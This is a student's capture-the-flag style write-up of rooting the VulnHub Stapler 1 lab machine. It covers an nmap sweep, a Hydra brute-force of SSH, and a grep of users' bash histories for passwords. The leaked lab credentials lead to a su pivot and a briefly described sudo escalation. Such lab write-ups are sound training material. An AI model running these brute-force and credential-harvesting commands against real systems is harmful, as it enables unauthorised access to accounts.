# VulnHub Stapler 1 — Lab Assignment

**Name:** Meheraz Hossen Siyam
**Lab:** VulnHub Stapler 1
**Platform:** Kali Linux
**Target IP:** 192.168.0.108

## Introduction

For this assignment, I was asked to solve the **VulnHub Stapler 1** machine. I used my Kali Linux VM as the attacking machine and Stapler as the target machine.

The main goal was to get access to the machine and eventually obtain **root access**.

At first, I didn't know exactly how I would get root. I had to enumerate the machine, find useful information, get an initial user account, and then look for a way to increase my privileges.

---

## 1. Finding the Target

First, I scanned my local network to find the available machines:

```bash
nmap -sn 192.168.0.0/24
```

I found the Stapler machine at:

```text
192.168.0.108
```

My Kali machine was on the same network, so I could communicate with the target.

---

## 2. Finding Services and Users

After finding the target, I started enumerating it with Nmap.

One of the important services I found was **SSH**.

I also collected usernames from the machine. There were many usernames, including:

```text
SHayslett
JKanode
peter
www
```

At this point, I knew SSH could potentially give me a way into the machine if I could find valid credentials.

---

## 3. Getting the First User Account

I used Hydra against the SSH service with the usernames and password list I had collected:

```bash
hydra -L users.txt -P passwords.txt -f -V ssh://192.168.0.108
```

Hydra eventually found valid credentials for:

```text
SHayslett
```

I then connected to the machine:

```bash
ssh SHayslett@192.168.0.108
```

Now I had a shell on the target.

I checked my privileges:

```bash
id
```

I was only:

```text
uid=1005(SHayslett)
gid=1005(SHayslett)
```

So I was **not root**.

---

## 4. Checking Sudo

My first thought was to check whether `SHayslett` could use sudo.

I tried:

```bash
sudo su
```

But the machine returned:

```text
SHayslett is not in the sudoers file.
```

So I couldn't simply use sudo from this account.

This meant I needed to continue enumerating the machine.

---

## 5. Looking at Other Users

I checked the `/home` directory:

```bash
ls -la /home
```

There were many user accounts.

Since I was already inside the machine, I started looking for files that might contain useful information.

One of the things I checked was users' Bash history.

I searched the home directories for commands related to SSH, passwords, `su`, and `sshpass`:

```bash
grep -RniE 'sshpass|password|ssh |su ' /home 2>/dev/null
```

This turned out to be the most important command of the whole lab.

---

## 6. Finding a Password in Bash History

The command found something interesting in:

```text
/home/JKanode/.bash_history
```

I found these commands:

```text
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
```

This was a big discovery.

The last command showed that the password for the `peter` account was:

```text
JZQuyIN5
```

So I had found credentials without having to crack another password.

This was also an important lesson for me because I realized that sometimes the easiest way to escalate privileges isn't finding a complicated exploit. A user's own history can expose sensitive information.

---

## 7. Switching to Peter

I used the discovered password to switch to the `peter` account:

```bash
su - peter
```

I entered:

```text
JZQuyIN5
```

and successfully became `peter`.

So my progress at this point was:

```text
SHayslett
   ↓
Read JKanode's history
   ↓
Find Peter's password
   ↓
peter
```

This was basically a user-to-user pivot on the same machine.

---

## 8. Checking Peter's Privileges

After becoming `peter`, I checked what privileges this account had:

```bash
sudo -l
```

This was important because I already knew from enumeration that `peter` was a more interesting account.

The sudo configuration provided the path for the final privilege escalation.

I used the permitted sudo access to obtain a root shell.

---

## 9. Getting Root

After using the allowed sudo path, I checked my identity:

```bash
whoami
```

The result was:

```text
root
```

So I had successfully completed the machine.

The final attack chain was:

```text
Target discovery
      ↓
Service enumeration
      ↓
SSH
      ↓
SHayslett
      ↓
Local enumeration
      ↓
JKanode's Bash history
      ↓
Peter's password
      ↓
peter
      ↓
sudo
      ↓
root
```

---

# What I Learned

The biggest thing I learned from this lab was that **enumeration is extremely important**.

Before doing this machine, I might have thought that getting root always means finding some huge vulnerability or running a complicated exploit.

But this machine showed me something different.

The important discovery was just a Bash history file:

```text
/home/JKanode/.bash_history
```

and inside it was a command containing another user's password.

So the attack was basically:

**Find → Enumerate → Understand → Reuse credentials → Escalate**

I also learned that getting an initial shell does not mean the machine is compromised completely. After getting `SHayslett`, I still had to figure out how that account could lead somewhere else.

Another thing I learned was not to immediately assume that every strange finding is the correct exploit. During enumeration I found an unusual Linux capability on:

```text
/usr/bin/systemd-detect-virt
```

with:

```text
cap_dac_override,cap_sys_ptrace+ep
```

It looked interesting, so I investigated it. However, it wasn't necessary for the attack path I eventually followed.

That taught me to focus on evidence and follow the attack chain instead of randomly trying every possible exploit.

---

# Final Attack Path

The complete path I used was:

```text
Kali Linux
     │
     ▼
192.168.0.108
     │
     ▼
SSH enumeration
     │
     ▼
SHayslett credentials
     │
     ▼
SSH access
     │
     ▼
Local enumeration
     │
     ▼
JKanode/.bash_history
     │
     ▼
Peter's password
     │
     ▼
peter
     │
     ▼
sudo -l
     │
     ▼
Root
```

## Conclusion

I successfully completed the VulnHub Stapler 1 machine and obtained root access.

The most valuable part of the lab for me was not simply getting the root shell. It was understanding **how one small piece of information led to the next stage**.

The main lesson I took from Stapler is:

> **Don't rush to exploit something. Enumerate first, understand what you find, and follow the evidence.**

In this case, a simple password left inside Bash history eventually led from an ordinary user account to root.
